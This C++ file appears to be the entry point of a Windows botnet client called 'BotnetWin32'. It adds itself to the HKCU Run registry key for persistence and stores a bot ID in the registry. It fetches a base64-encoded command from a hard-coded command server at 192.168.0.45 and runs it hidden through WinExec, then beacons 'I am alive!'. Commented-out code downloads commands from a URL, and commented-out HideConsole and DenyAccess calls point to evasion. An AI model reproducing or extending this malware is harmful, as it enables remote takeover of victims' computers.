// BotnetWin32.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "BotnetWin32.h"
#include "Utils.h"
#include "Connection.h"
#include "base64.h"

char* ip = "192.168.0.45";
TCHAR buf[255] = { 0 };
Utils utils;
Connection conn(ip, 80);
base64 base;

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	//utils.HideConsole();
	//utils.DenyAccess();

	//Accessing the registry value for autoloading

	HKEY hKey;
	if(RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		//Checking if the registry value exists

		DWORD dwType = REG_SZ;
		DWORD dwBufSize = sizeof(buf);
		if(RegQueryValueEx(hKey, L"Spyke", 0, &dwType, (LPBYTE)buf, &dwBufSize) != ERROR_SUCCESS)
			// Creating the registry value for autoloading
			utils.Autoload();
	}
	else
		utils.Autoload();

	// Accessing the registry value for ID

	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		//Checking if the registry value exists

		DWORD dwType = REG_SZ;
		DWORD dwBufSize = sizeof(buf);
		if (RegQueryValueExW(hKey, L"ID", 0, NULL, (LPBYTE)buf, &dwBufSize) == ERROR_SUCCESS)
		{
			// Set the class attribute equal to the registry value
			utils.SetID(buf);
		}
		else
		{
			// Generate a new ID and create a new registry value
			utils.GenerateID();
		}
	}
	else
	{
		utils.GenerateID();
	}

	// Reading a command to execute
	char* cmdptr = conn.ReadCommand(); 
	string command = string(cmdptr, strlen(cmdptr));
	command = base.base64_decode(command);
	WinExec(command.c_str(), SW_HIDE);

	// Sending hello to the server
	Connection conn(ip, 80);
	conn.SendBasicInfo(utils.GetID(), "I am alive!");

	// Sending an ID and a message 
	//conn.Send(utils.GetID());
	//conn.Send("I am alive!");
	/*
	TCHAR url[] = TEXT("http://127.0.0.1/cmd");
	TCHAR path[MAX_PATH + 1];
	DWORD len = MAX_PATH + 1;
	GetTempPath(len, path);
	TCHAR* full_path = _tcscat(path, L"command.txt");
	wstring ws(full_path);
	string Path = string(ws.begin(), ws.end());
	utils.DownloadFile(url, full_path);

	ifstream ffi(full_path);
	string based_string;
	ffi >> based_string;
	based_string = base.base64_decode(based_string);
	*/

	return 0;
}

